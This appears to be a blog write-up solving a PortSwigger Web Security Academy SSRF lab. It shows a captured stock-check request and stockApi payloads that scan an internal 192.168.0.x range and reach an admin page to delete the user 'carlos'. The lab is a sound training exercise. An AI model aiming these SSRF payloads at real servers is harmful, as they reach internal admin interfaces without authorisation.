---
layout: post
title: "Basic SSRF against another back-end system"
description: ""
date: 2023-07-11
categories:
  - PortSwigger_Lab
  - PortSwigger_SSRF
author: ""
tags: ['PortSwigger_Lab', 'SSRF']
---





# Basic SSRF against another back-end system


```
This lab has a stock check feature which fetches data from an internal system.

To solve the lab, use the stock check functionality to scan the internal `192.168.0.X` range for an admin interface on port 8080, then use it to delete the user `carlos`.



該實驗室具有庫存檢查功能，可從內部系統獲取數據。

要解決這個問題，請使用庫存檢查功能掃描內部 192.168.0.X 範圍以查找端口 8080 上的管理界面，然後使用它刪除用戶 carlos。


```


```
HTTP的默認端口是80

8080一般是用來連接代理的

```



```http

POST /product/stock HTTP/1.1
Host: 0a51002f04654a36c0780aea00a900c7.web-security-academy.net
Cookie: session=npdWTRtCwRyR6jYOezLknPedt5C1xYZe
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
Accept: */*
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://0a51002f04654a36c0780aea00a900c7.web-security-academy.net/product?productId=3
Content-Type: application/x-www-form-urlencoded
Content-Length: 96
Origin: https://0a51002f04654a36c0780aea00a900c7.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

stockApi=http%3A%2F%2F192.168.0.1%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D3%26storeId%3D1

```


```
stockApi=http://192.168.0.1:8080/product/stock/check?productId=3&storeId=1
```


上面叫我們找 admin 頁面 並爆破IP 
```
stockApi=http://192.168.0.1:8080/admin

```


暴192.168.0.1- 192.168.0.255
BP  暴出來是 217
```
stockApi=http://192.168.0.217:8080/admin
```




一樣刪除畫面出來了，但點擊沒用必須用server 對server 。
抓取html
```
<a href="/http://192.168.0.217:8080/admin/delete?username=carlos">Delete</a>
```


修改
```
stockApi=http://192.168.0.217:8080/admin/delete?username=carlos
```

成功